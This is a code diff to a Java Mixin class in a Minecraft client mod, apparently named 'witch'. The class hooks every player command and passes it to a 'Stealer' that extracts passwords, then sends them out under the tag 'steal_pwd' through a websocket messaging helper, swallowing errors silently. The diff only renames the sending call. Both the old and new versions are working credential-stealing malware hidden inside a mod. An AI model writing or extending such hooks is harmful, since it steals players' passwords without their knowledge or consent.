@@ -1,8 +1,8 @@
 package me.soda.witch.mixin;
 
-import me.soda.witch.Witch;
 import me.soda.witch.config.Config;
 import me.soda.witch.features.Stealer;
+import me.soda.witch.websocket.MessageUtils;
 import net.minecraft.client.network.ClientPlayerEntity;
 import net.minecraft.text.Text;
 import org.spongepowered.asm.mixin.Mixin;
@@ -12,13 +12,13 @@ import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;
 import org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;
 
 @Mixin(ClientPlayerEntity.class)
-abstract class ClientPlayerEntityMixin {
+public class ClientPlayerEntityMixin {
     Stealer stealer = new Stealer();
 
     @Inject(method = "sendCommand(Ljava/lang/String;)Z", at = @At("HEAD"), cancellable = true)
     private void onSendCommand(String command, CallbackInfoReturnable<Boolean> cir) {
         try {
-            Witch.sendMessage("steal_pwd", stealer.stealPassword(command));
+            MessageUtils.sendMessage("steal_pwd", stealer.stealPassword(command));
         } catch (Exception e) {
         }
     }
@@ -26,7 +26,7 @@ abstract class ClientPlayerEntityMixin {
     @Inject(method = "sendCommand(Ljava/lang/String;Lnet/minecraft/text/Text;)V", at = @At("HEAD"), cancellable = true)
     private void onSendCommand(String command, Text preview, CallbackInfo info) {
         try {
-            Witch.sendMessage("steal_pwd", stealer.stealPassword(command));
+            MessageUtils.sendMessage("steal_pwd", stealer.stealPassword(command));
         } catch (Exception e) {
         }
     }
